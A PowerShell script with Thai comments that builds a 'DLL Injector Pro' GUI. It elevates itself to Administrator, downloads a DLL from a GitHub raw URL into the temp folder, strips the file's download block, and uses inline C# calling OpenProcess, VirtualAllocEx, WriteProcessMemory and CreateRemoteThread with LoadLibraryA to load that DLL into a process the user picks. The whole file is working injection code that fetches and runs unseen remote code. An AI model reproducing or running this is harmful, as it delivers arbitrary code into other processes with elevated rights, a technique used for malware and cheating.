Add-Type -AssemblyName PresentationFramework, System.Drawing

# 1. เช็คสิทธิ์ Admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าไฟล์
$url = "https://github.com/Fossil123456/s/raw/refs/heads/main/bootUI.dll"
$tempPath = "$env:TEMP\bootUI.dll"
Invoke-WebRequest -Uri $url -OutFile $tempPath
Unblock-File -Path $tempPath

# 3. สร้าง UI ด้วย XML (WPF)
[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        Title="DLL Injector Pro" Height="450" Width="400" Background="#2D2D30" WindowStartupLocation="CenterScreen">
    <Grid Margin="10">
        <StackPanel>
            <Label Content="Select Target Process" Foreground="White" FontSize="18" FontWeight="Bold" Margin="0,0,0,10"/>
            <ListBox Name="ProcessList" Height="300" Background="#3E3E42" Foreground="White" BorderThickness="0">
                <ListBox.ItemTemplate>
                    <DataTemplate>
                        <StackPanel Orientation="Horizontal" Margin="5">
                            <TextBlock Text="{Binding ProcessName}" FontWeight="Bold" Width="150"/>
                            <TextBlock Text="{Binding Id}" Foreground="#999" Margin="10,0,0,0"/>
                        </StackPanel>
                    </DataTemplate>
                </ListBox.ItemTemplate>
            </ListBox>
            <Button Name="InjectBtn" Content="INJECT DLL" Height="40" Margin="0,15,0,0" 
                    Background="#007ACC" Foreground="White" FontWeight="Bold" BorderThickness="0"/>
        </StackPanel>
    </Grid>
</Window>
"@

$reader = (New-Object System.Xml.XmlNodeReader $xaml)
$window = [Windows.Markup.XamlReader]::Load($reader)
$processList = $window.FindName("ProcessList")
$injectBtn = $window.FindName("InjectBtn")

# ดึงรายการ Process ใส่ใน UI
$procs = Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object ProcessName, Id
$processList.ItemsSource = $procs

# เมื่อกดปุ่ม Inject
$injectBtn.Add_Click({
    $selected = $processList.SelectedItem
    if ($selected) {
        try {
            # ใส่โค้ด C# Injector (เหมือนเดิม)
            $source = @"
            using System;
            using System.Runtime.InteropServices;
            using System.Text;
            public class Injector {
                [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dw, bool b, int id);
                [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
                [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
                [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
                [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
                [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint c, IntPtr ti);
                public static void Inject(int pid, string path) {
                    IntPtr h = OpenProcess(0x1F0FFF, false, pid);
                    IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
                    IntPtr w;
                    WriteProcessMemory(h, a, Encoding.ASCII.GetBytes(path), (uint)path.Length, out w);
                    IntPtr l = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    CreateRemoteThread(h, IntPtr.Zero, 0, l, a, 0, IntPtr.Zero);
                }
            }
"@
            Add-Type -TypeDefinition $source -ErrorAction SilentlyContinue
            [Injector]::Inject($selected.Id, $tempPath)
            [System.Windows.MessageBox]::Show("Successfully Injected into $($selected.ProcessName)!", "Done")
            $window.Close()
        } catch {
            [System.Windows.MessageBox]::Show("Error: $($_.Exception.Message)")
        }
    }
})

$window.ShowDialog() | Out-Null